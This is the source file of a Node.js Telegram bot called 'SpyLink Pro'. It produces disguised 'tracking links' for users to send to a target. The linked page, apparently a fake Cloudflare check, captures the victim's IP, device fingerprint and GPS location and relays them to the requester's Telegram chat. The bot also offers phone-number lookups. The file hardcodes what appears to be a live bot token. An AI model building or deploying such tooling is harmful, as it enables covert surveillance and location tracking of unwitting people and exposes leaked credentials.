// server.js — v9.0: URL Submission Fixed + Broadcast System + Improved UX
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 CONFIG
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_CHAT_ID = "8175884349";
const HOST_URL = "https://botu-s3f9.onrender.com";
const BANNED_NUMBERS = ["9161636853", "9451180555", "6306791897"];

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Crash Protection
process.on('unhandledRejection', console.error);
process.on('uncaughtException', console.error);

// Middleware
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('dev'));
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.set("view engine", "ejs");

// State Management
let sessions = {};
let awaitingUrl = {}; // chatId -> true
let broadcastMode = false;
let broadcastTarget = null;

// ==================== TELEGRAM BOT — FIXED URL HANDLING ====================

bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();

    console.log(`📩 MESSAGE [${chatId}]:`, text);

    // 📢 BROADCAST MODE (Admin only)
    if (broadcastMode && String(chatId) === ADMIN_CHAT_ID && text !== "/cancel") {
      return await executeBroadcast(text);
    }

    // 🌐 URL SUBMISSION — FIXED: Works even without reply context
    if (awaitingUrl[chatId] && text) {
      delete awaitingUrl[chatId];
      return handleUrlSubmission(chatId, text);
    }

    // 📱 PHONE NUMBER SUBMISSION
    if (msg?.reply_to_message?.text?.includes("phone number") && text) {
      return handleNumberInfo(chatId, text);
    }

    // COMMANDS
    if (text === "/start") return sendWelcome(chatId);
    if (text === "/create") return requestUrl(chatId);
    if (text === "/numberinfo") return requestPhoneNumber(chatId);
    if (text === "/help") return sendHelp(chatId);
    if (text === "/menu") return sendMainMenu(chatId);
    if (text === "/panel") {
      if (String(chatId) === ADMIN_CHAT_ID) return showAdminPanel(chatId);
      else return bot.sendMessage(chatId, "⛔ Admin only.");
    }
    if (text === "/broadcast" && String(chatId) === ADMIN_CHAT_ID) {
      return startBroadcast(chatId);
    }
    if (text === "/cancel" && broadcastMode && String(chatId) === ADMIN_CHAT_ID) {
      broadcastMode = false;
      broadcastTarget = null;
      return bot.sendMessage(chatId, "🛑 Broadcast cancelled.");
    }

    // DEFAULT: If user sends URL directly without /create
    if (text?.match(/^https?:\/\//i)) {
      return handleUrlSubmission(chatId, text); // ← DIRECT FIX: Accept URL anytime
    }

    console.log("🗑️ No handler for:", text);

  } catch (error) {
    console.error("❌ Message handler error:", error);
    bot.sendMessage(msg.chat.id, "⚠️ Something went wrong. Please retry.");
  }
});

bot.on('callback_query', async (query) => {
  try {
    await bot.answerCallbackQuery(query.id);
    const chatId = query.message.chat.id;
    const data = query.data;

    console.log(`🖱️ CALLBACK [${chatId}]:`, data);

    // ADMIN ACTIONS
    if (data === "admin_sessions") return viewAllSessions(chatId);
    if (data === "admin_stats") return sendStats(chatId);
    if (data === "admin_clear") return clearAllSessions(chatId);
    if (data === "admin_broadcast") return startBroadcast(chatId);

    // USER ACTIONS
    if (data === "create_new") {
      awaitingUrl[chatId] = true;
      return bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
        reply_markup: { force_reply: true }
      });
    }
    if (data === "number_info") return requestPhoneNumber(chatId);
    if (data === "main_menu") return sendMainMenu(chatId);
    if (data === "help_cmd") return sendHelp(chatId);
    if (data === "back_to_panel") return showAdminPanel(chatId);

  } catch (error) {
    console.error("❌ Callback error:", error);
  }
});

// ==================== BROADCAST SYSTEM ====================

async function startBroadcast(chatId) {
  broadcastMode = true;
  broadcastTarget = "ALL"; // Could be segmented later
  bot.sendMessage(chatId, "📣 *BROADCAST MODE ACTIVATED*\n\nSend the message you want to broadcast to ALL users.\n\nSend /cancel to abort.", {
    parse_mode: "Markdown"
  });
}

async function executeBroadcast(messageText) {
  const totalUsers = new Set(Object.values(sessions).map(s => s.chatId));
  let sentCount = 0;
  let errorCount = 0;

  // Add admin as recipient too
  totalUsers.add(parseInt(ADMIN_CHAT_ID));

  for (let userId of totalUsers) {
    if (!userId) continue;
    try {
      await bot.sendMessage(userId, messageText, {
        parse_mode: "HTML", // Allows formatting without "forwarded" tag
        disable_web_page_preview: false
      });
      sentCount++;
    } catch (err) {
      console.error(`Failed to send to ${userId}:`, err.message);
      errorCount++;
    }
    // Avoid rate limits
    await new Promise(r => setTimeout(r, 100));
  }

  broadcastMode = false;
  broadcastTarget = null;

  bot.sendMessage(ADMIN_CHAT_ID, `
✅ *BROADCAST COMPLETED*

📬 Sent to: ${sentCount} users
❌ Failed: ${errorCount}
`, { parse_mode: "Markdown" });
}

// ==================== DATA ENDPOINTS (UNCHANGED — WORKING) ====================

app.post("/data", (req, res) => {
  const { uid, data } = req.body;
  console.log("📡 /data hit | UID:", uid);

  if (!uid || !data) return res.status(400).send("Missing params");

  if (!sessions[uid]) {
    sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() };
    console.log("🆕 New session:", uid);
  }

  sessions[uid].data = decodeURIComponent(data);
  sessions[uid].ip = getIP(req);
  sessions[uid].lastData = new Date();

  checkAndDeliver(uid);
  res.send("OK");
});

app.post("/location", (req, res) => {
  const { uid, lat, lon } = req.body;
  console.log("📍 /location hit | UID:", uid);

  if (!uid || !lat || !lon) return res.status(400).send("Missing params");

  if (sessions[uid]) {
    sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(req.body.acc || 0) };
    sessions[uid].lastLocation = new Date();
    checkAndDeliver(uid);
  }
  res.send("OK");
});

function checkAndDeliver(sessionId) {
  const session = sessions[sessionId];
  if (!session || session.reported || !session.data) return;

  session.reported = true;
  console.log("📤 Delivering to:", session.chatId);

  let cleanData = session.data
    .replaceAll("<br>", "\n")
    .replaceAll("<b>", "*")
    .replaceAll("</b>", "*")
    .replaceAll("<code>", "`")
    .replaceAll("</code>", "`");

  let msg = `
✅ <b>FULL REPORT RECEIVED</b>

🆔 <b>Session:</b> <code>${sessionId}</code>
🌐 <b>URL:</b> ${session.url || 'N/A'}
📡 <b>IP:</b> <code>${session.ip || 'Unknown'}</code>
🕒 <b>Time:</b> ${new Date().toLocaleTimeString()}

📱 <b>DEVICE DATA:</b>
${cleanData.replace(/\*/g, '')}
`;

  if (session.location) {
    msg += `\n\n🗺️ <b>LOCATION:</b>\nLat: <code>${session.location.lat}</code>\nLon: <code>${session.location.lon}</code>\nAccuracy: <code>${session.location.accuracy}m</code>`;
  }

  bot.sendMessage(session.chatId, msg, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 New Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  }).catch(console.error);
}

// ==================== UTILITIES ====================

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Please send a valid URL starting with http:// or https://");
  }

  const sessionId = uuidv4();
  sessions[sessionId] = { chatId, url, createdAt: new Date() };

  const link = `${HOST_URL}/c/${sessionId}/${btoa(encodeURIComponent(url))}`;

  bot.sendMessage(chatId, `
🚀 <b>TRACKING LINK READY</b>

🔗 <b>Target:</b> ${url}
🆔 <b>Session ID:</b> <code>${sessionId}</code>

🌐 <b>Send this link to your target:</b>
${link}

⏱️ Open on mobile for location + full fingerprint.
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Create Another", callback_data: "create_new" }],
        [{ text: "📱 Number Lookup", callback_data: "number_info" }],
        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function requestUrl(chatId) {
  awaitingUrl[chatId] = true;
  bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
    reply_markup: { force_reply: true }
  });
}

function requestPhoneNumber(chatId) {
  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
    reply_markup: { force_reply: true }
  });
}

// HELP — Simplified HTML
function sendHelp(chatId) {
  bot.sendMessage(chatId, `
📘 <b>HELP GUIDE</b>

<b>TRACKING LINK:</b>
1. Tap "Create Link"
2. Send any URL
3. Send generated link to target
4. Get full device + location report

<b>PHONE LOOKUP:</b>
Send 10-digit number (e.g., 7800418265)

<b>BANNED NUMBERS:</b>
9161636853, 9451180555, 6306791897

<b>COMMANDS:</b>
/start - Welcome
/create - New link
/numberinfo - Lookup
/panel - Admin
/broadcast - (Admin) Send to all
/help - This guide

👨‍💻 @aadi_io
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, "🏠 <b>MAIN MENU</b>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

function sendWelcome(chatId) {
  bot.sendMessage(chatId, "🎯 <b>Welcome to SpyLink Pro!</b>\n\nChoose an option below 👇", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

// ==================== ADMIN PANEL ====================

function showAdminPanel(chatId) {
  const total = Object.keys(sessions).length;
  const reported = Object.values(sessions).filter(s => s.reported).length;

  bot.sendMessage(chatId, `
🔐 <b>ADMIN PANEL</b>

📊 Sessions: ${total}
✅ Reported: ${reported}
⏳ Pending: ${total - reported}
⏱️ Uptime: ${Math.floor(process.uptime())}s

👇 <b>ACTIONS:</b>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ View Sessions", callback_data: "admin_sessions" }],
        [{ text: "📈 Stats", callback_data: "admin_stats" }],
        [{ text: "🗑️ Clear All", callback_data: "admin_clear" }],
        [{ text: "📣 Broadcast", callback_data: "admin_broadcast" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function viewAllSessions(chatId) {
  let list = Object.entries(sessions).slice(0,20);
  let msg = list.length ? "<b>📋 ACTIVE SESSIONS</b>\n\n" : "📭 No active sessions.\n";

  list.forEach(([id, s], i) => {
    msg += `<b>${i+1}. ${id.substring(0,6)}...</b>\n`;
    msg += `👤 User: ${s.chatId}\n`;
    msg += `✅ Status: ${s.reported ? 'Delivered' : 'Pending'}\n`;
    msg += `🌐 URL: ${s.url ? s.url.replace(/^https?:\/\//, '').substring(0,25) + '...' : 'N/A'}\n`;
    msg += `📍 Location: ${s.location ? 'Captured' : 'None'}\n---\n`;
  });

  bot.sendMessage(chatId, msg, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

function sendStats(chatId) {
  const mem = process.memoryUsage();
  bot.sendMessage(chatId, `
📊 <b>SERVER STATS</b>

📈 Sessions: ${Object.keys(sessions).length}
MemoryWarning: ${(mem.heapUsed/1024/1024).toFixed(1)} MB
⏱️ Uptime: ${Math.floor(process.uptime())} sec
👥 Unique Users: ${new Set(Object.values(sessions).map(s => s.chatId)).size}
`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

function clearAllSessions(chatId) {
  const count = Object.keys(sessions).length;
  sessions = {};
  bot.sendMessage(chatId, `✅ <b>Cleared ${count} sessions.</b>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

// ==================== EXPRESS ROUTES ====================

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  const { sessionId, encodedUrl } = req.params;
  const url = decodeURIComponent(atob(encodedUrl));

  if (!sessions[sessionId]) {
    sessions[sessionId] = { chatId: null, createdAt: new Date() };
  }
  sessions[sessionId].url = url;

  res.render("cloudflare", {
    ip: getIP(req),
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    url: url,
    uid: sessionId,
    a: HOST_URL,
    t: false
  });
});

app.get("/", (req, res) => {
  res.json({ ok: true, version: "9.0-BROADCAST", sessions: Object.keys(sessions).length });
});

// Cleanup every 15 minutes
setInterval(() => {
  const now = new Date();
  let count = 0;
  for (let id in sessions) {
    if (now - new Date(sessions[id].createdAt) > 900000) { // 15 min
      delete sessions[id];
      count++;
    }
  }
  if (count > 0) console.log(`🧹 Cleaned ${count} old sessions`);
}, 900000);

// Start Server
const PORT = process.env.PORT || 10000; // ← Render uses 10000
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SERVER v9.0 READY — BROADCAST SYSTEM ADDED`);
  console.log(`🔗 Port: ${PORT}`);
  console.log(`🌐 Host: ${HOST_URL}`);
});
